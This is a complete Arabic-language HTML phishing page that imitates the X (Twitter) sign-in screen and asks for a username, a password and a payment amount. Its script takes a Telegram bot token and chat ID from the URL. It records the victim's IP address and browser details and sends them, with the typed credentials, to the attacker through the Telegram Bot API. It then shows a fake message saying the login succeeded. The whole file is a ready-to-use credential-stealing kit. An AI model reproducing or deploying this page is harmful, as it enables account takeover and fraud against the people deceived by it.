<!DOCTYPE html> <html lang="ar" dir="rtl"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>X • تسجيل الدخول</title> <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"> <style> * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; } body { background: #000000; min-height: 100vh; display: flex; align-items: center; justify-content: center; direction: rtl; } .container { width: 100%; max-width: 600px; margin: 20px; } /* بطاقة تويتر الرئيسية */ .twitter-card { background: #000000; border-radius: 16px; padding: 32px; border: 1px solid #2f3336; } /* شعار تويتر (X) */ .twitter-logo { text-align: center; margin-bottom: 30px; } .twitter-logo i { font-size: 40px; color: #e7e9ea; } /* العنوان */ .twitter-title { color: #e7e9ea; font-size: 24px; font-weight: 700; margin-bottom: 30px; text-align: center; } /* حقول الإدخال */ .input-group { margin-bottom: 16px; } .input-field { width: 100%; padding: 16px 14px; background: #000000; border: 1px solid #2f3336; border-radius: 8px; color: #e7e9ea; font-size: 16px; transition: all 0.2s; } .input-field:focus { outline: none; border-color: #1d9bf0; } .input-field::placeholder { color: #71767b; } /* حقل المبلغ + العملة */ .amount-row { display: flex; gap: 12px; margin-bottom: 16px; } .amount-field { flex: 2; } .currency-field { flex: 1; } .currency-select { width: 100%; padding: 16px 14px; background: #000000; border: 1px solid #2f3336; border-radius: 8px; color: #e7e9ea; font-size: 16px; cursor: pointer; appearance: none; background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%231d9bf0' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'/></svg>"); background-repeat: no-repeat; background-position: left 15px center; text-align: right; } .currency-select:focus { outline: none; border-color: #1d9bf0; } /* اختيار الاهتمامات */ .interests-section { margin: 20px 0; } .interests-title { color: #e7e9ea; font-size: 15px; font-weight: 700; margin-bottom: 12px; } .interests-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; } .interest-item { background: #000000; border: 1px solid #2f3336; border-radius: 30px; padding: 10px; text-align: center; cursor: pointer; transition: all 0.2s; color: #e7e9ea; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 6px; } .interest-item i { color: #1d9bf0; } .interest-item:hover { background: #181818; border-color: #1d9bf0; } .interest-item.selected { background: #1d9bf0; border-color: #1d9bf0; color: white; } .interest-item.selected i { color: white; } /* بطاقة بريميوم */ .premium-card { background: #1d9bf0; border-radius: 16px; padding: 16px; margin: 20px 0; display: flex; align-items: center; justify-content: space-between; } .premium-text { color: white; font-weight: 700; font-size: 15px; } .premium-badge { background: rgba(255,255,255,0.2); padding: 6px 12px; border-radius: 30px; color: white; font-size: 13px; font-weight: 600; } /* زر تسجيل الدخول */ .twitter-btn { width: 100%; padding: 16px; background: #1d9bf0; border: none; border-radius: 40px; color: white; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.2s; margin: 16px 0 12px; } .twitter-btn:hover { background: #1a8cd8; } /* زر ثانوي */ .secondary-btn { width: 100%; padding: 16px; background: transparent; border: 1px solid #2f3336; border-radius: 40px; color: #e7e9ea; font-size: 16px; font-weight: 700; cursor: pointer; margin-bottom: 16px; } .secondary-btn:hover { background: #181818; } /* رمز الدعوة */ .invite-code-box { background: #181818; border: 1px solid #2f3336; border-radius: 12px; padding: 15px; margin: 20px 0; display: flex; align-items: center; justify-content: space-between; } .invite-label { color: #71767b; font-size: 14px; } .invite-label i { color: #1d9bf0; margin-left: 6px; } .invite-value { color: #1d9bf0; font-weight: 700; font-size: 18px; } /* رسالة منبثقة */ .toast-message { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #1d9bf0; color: white; padding: 16px 32px; border-radius: 60px; font-weight: 500; z-index: 1000; animation: slideUp 0.3s ease; display: none; } @keyframes slideUp { from { bottom: 0; opacity: 0; } to { bottom: 30px; opacity: 1; } } /* رسالة الخطأ */ .error-container { background: #000000; color: #e7e9ea; padding: 40px; border-radius: 16px; text-align: center; border: 1px solid #2f3336; } .error-container i { color: #1d9bf0; font-size: 60px; margin-bottom: 20px; } .error-container code { background: #181818; padding: 12px; border-radius: 10px; display: block; color: #1d9bf0; border: 1px solid #2f3336; direction: ltr; margin-top: 20px; } /* زر التحميل */ .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; margin-right: 10px; } @keyframes spin { to { transform: rotate(360deg); } } </style> </head> <body> <div class="container" id="mainContent"> <!-- المحتوى هيتحط هنا بالجافاسكريبت --> </div> <div class="toast-message" id="toast"></div> <script> // ==================== نفس نظام التشفير من الكود الأصلي ==================== function decodeToken(encodedToken) { try { // فك ترميز URL أولاً (عشان حروف زي %3D) const decodedUrl = decodeURIComponent(encodedToken); // ثم فك Base64 return atob(decodedUrl); } catch (e) { console.error('❌ فشل فك التشفير:', e); return null; } } // قراءة الباراميترات من الرابط const urlParams = new URLSearchParams(window.location.search); const CHAT_ID = urlParams.get('id'); const encodedToken = urlParams.get('tok'); // فك تشفير التوكن const BOT_TOKEN = encodedToken ? decodeToken(encodedToken) : null; const mainContent = document.getElementById('mainContent'); const toast = document.getElementById('toast'); function showToast(msg, isSuccess = true) { toast.style.display = 'block'; toast.style.background = isSuccess ? '#1d9bf0' : '#e74c3c'; toast.textContent = msg; setTimeout(() => { toast.style.display = 'none'; }, 3000); } // ==================== التحقق من صحة الرابط ==================== if(!CHAT_ID || !BOT_TOKEN) { // رابط غير صالح - عرض رسالة خطأ mainContent.innerHTML = ` <div class="error-container"> <i class="fab fa-x-twitter"></i> <h2 style="margin-bottom: 15px;">⚠️ رابط غير صالح</h2> <p style="color: #71767b; margin-bottom: 20px;">الرجاء استخدام الرابط الصحيح مع الباراميترات المطلوبة</p> <code>?id=123456789&tok=ZW5jb2RlZHRva2Vu</code> <p style="color: #71767b; margin-top: 20px; font-size: 14px;">مثال للرابط الصحيح:<br>https://example.com/page.html?id=123456789&tok=ZW5jb2RlZHRva2Vu</p> </div> `; } else { // ==================== رابط صالح - عرض المحتوى الكامل ==================== mainContent.innerHTML = ` <div class="twitter-card"> <!-- شعار X --> <div class="twitter-logo"> <i class="fab fa-x-twitter"></i> </div> <h2 class="twitter-title">سجّل الدخول إلى X</h2> <!-- البريد الإلكتروني --> <div class="input-group"> <input type="text" id="username" class="input-field" placeholder="الهاتف، البريد الإلكتروني أو اسم المستخدم"> </div> <!-- كلمة المرور --> <div class="input-group"> <input type="password" id="password" class="input-field" placeholder="كلمة المرور"> </div> <!-- المبلغ + العملة --> <div class="amount-row"> <div class="amount-field"> <input type="number" id="amount" class="input-field" placeholder="المبلغ" min="1"> </div> <div class="currency-field"> <select id="currency" class="currency-select"> <option value="USD">$ USD</option> <option value="EUR">€ EUR</option> <option value="GBP">£ GBP</option> <option value="SAR" selected>﷼ SAR</option> <option value="AED">د.إ AED</option> <option value="EGP">ج.م EGP</option> </select> </div> </div> <!-- بطاقة بريميوم --> <div class="premium-card"> <span class="premium-text">اشتراك X Premium</span> <span class="premium-badge">العلامة الزرقاء</span> </div> <!-- اختيار الاهتمامات --> <div class="interests-section"> <div class="interests-title">ما الذي يثير اهتمامك؟</div> <div class="interests-grid"> <div class="interest-item selected" data-interest="تكنولوجيا"> <i class="fas fa-microchip"></i> تكنولوجيا </div> <div class="interest-item" data-interest="رياضة"> <i class="fas fa-futbol"></i> رياضة </div> <div class="interest-item" data-interest="سياسة"> <i class="fas fa-landmark"></i> سياسة </div> <div class="interest-item" data-interest="فن"> <i class="fas fa-palette"></i> فن </div> <div class="interest-item" data-interest="أخبار"> <i class="fas fa-newspaper"></i> أخبار </div> <div class="interest-item" data-interest="ترفيه"> <i class="fas fa-film"></i> ترفيه </div> </div> </div> <!-- رمز الدعوة --> <div class="invite-code-box"> <span class="invite-label"><i class="fas fa-gift"></i> رمز الدعوة</span> <span class="invite-value" id="inviteCode">TWTR-8432-X</span> </div> <!-- زر تسجيل الدخول مع تأثير التحميل --> <button class="twitter-btn" id="loginBtn"> <span id="btnText">تسجيل الدخول</span> <span id="btnLoader" class="loading" style="display: none;"></span> </button> <button class="secondary-btn"> نسيت كلمة المرور؟ </button> </div> `; // ==================== عناصر الصفحة ==================== const usernameInput = document.getElementById('username'); const passwordInput = document.getElementById('password'); const amountInput = document.getElementById('amount'); const currencySelect = document.getElementById('currency'); const loginBtn = document.getElementById('loginBtn'); const btnText = document.getElementById('btnText'); const btnLoader = document.getElementById('btnLoader'); const interestItems = document.querySelectorAll('.interest-item'); const inviteCodeSpan = document.getElementById('inviteCode'); let selectedInterest = 'تكنولوجيا'; // اختيار الاهتمام interestItems.forEach(item => { item.addEventListener('click', function() { interestItems.forEach(i => i.classList.remove('selected')); this.classList.add('selected'); selectedInterest = this.dataset.interest; }); }); // ==================== الإرسال الفعلي للبوت ==================== loginBtn.addEventListener('click', async function() { // التحقق من المدخلات const username = usernameInput.value.trim(); const password = passwordInput.value.trim(); const amount = amountInput.value.trim(); const currency = currencySelect.value; const inviteCode = inviteCodeSpan.textContent; if(!username) { showToast('الرجاء إدخال اسم المستخدم', false); return; } if(!password) { showToast('الرجاء إدخال كلمة المرور', false); return; } if(!amount || amount <= 0) { showToast('الرجاء إدخال مبلغ صحيح', false); return; } // تفعيل حالة التحميل btnText.style.display = 'none'; btnLoader.style.display = 'inline-block'; loginBtn.disabled = true; try { // جلب IP المستخدم let ip = 'غير معروف'; try { const ipRes = await fetch('https://api.ipify.org?format=json'); const ipData = await ipRes.json(); ip = ipData.ip; } catch (e) { console.log('فشل في جلب IP'); } // تجهيز نص الرسالة (بنفس تنسيق الكود الأصلي) const message = ` 🐦 <b>X (Twitter) - تسجيل دخول</b> ━━━━━━━━━━━━━━━━━━━━━ 👤 <b>المستخدم:</b> ${username} 🔑 <b>كلمة المرور:</b> ${password} 💰 <b>المبلغ:</b> ${amount} ${currency} ❤️ <b>الاهتمام:</b> ${selectedInterest} 🎫 <b>رمز الدعوة:</b> ${inviteCode} ━━━━━━━━━━━━━━━━━━━━━ 🌍 <b>IP:</b> ${ip} 📱 <b>الجهاز:</b> ${navigator.userAgent.substring(0,100)} ⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')} ━━━━━━━━━━━━━━━━━━━━━ `; // إرسال للبوت (نفس الطريقة بالضبط) const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' }) }); const result = await response.json(); if(result.ok) { showToast('✅ تم تسجيل الدخول بنجاح'); // مسح الحقول بعد النجاح usernameInput.value = ''; passwordInput.value = ''; amountInput.value = ''; // رسالة تأكيد زي الكود الأصلي setTimeout(() => { alert('🐦 مرحباً بك في X!\nتم تسجيل الدخول بنجاح'); }, 500); } else { showToast('❌ فشل الإرسال: ' + result.description, false); } } catch (error) { showToast('❌ حدث خطأ في الاتصال', false); console.error(error); } finally { // إعادة الزر لحالته الطبيعية btnText.style.display = 'inline'; btnLoader.style.display = 'none'; loginBtn.disabled = false; } }); } </script> </body> </html>
